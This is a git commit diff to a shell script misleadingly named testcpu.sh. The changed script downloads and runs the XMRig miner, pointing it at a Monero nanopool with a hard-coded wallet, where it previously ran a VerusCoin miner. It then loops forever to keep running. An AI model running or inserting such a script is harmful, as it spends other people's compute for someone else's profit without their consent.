56e7e244cc6912e6ae53b88e112ff4c4e003d461
zeshan5555 <88017843+zeshan5555@users.noreply.github.com>
2021-08-15 16:04:08 +0500

    Update testcpu.sh

--- testcpu.sh
+++ testcpu.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tgz 
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz 
-nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RMvS7QUDtjzcVh7w8RugbgyqHDBbykTNu1.zeshannrun -p x -t 4
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
+tar xf xmrig-6.14.0-linux-x64.tar.gz
+cd xmrig-6.14.0
+./xmrig -o xmr-asia1.nanopool.org:14433 -u 85eiAbJ4K9q19UPeKARkeSU8GuowFkJWS16MB74DJXY49QSswuioEtqaeaBu3j8fJm2MfjwJj9974AYoef8VJPr1TRtfEvU.Z1 --tls --coin monero
 while [ 1 ]; do
 sleep 3
 done
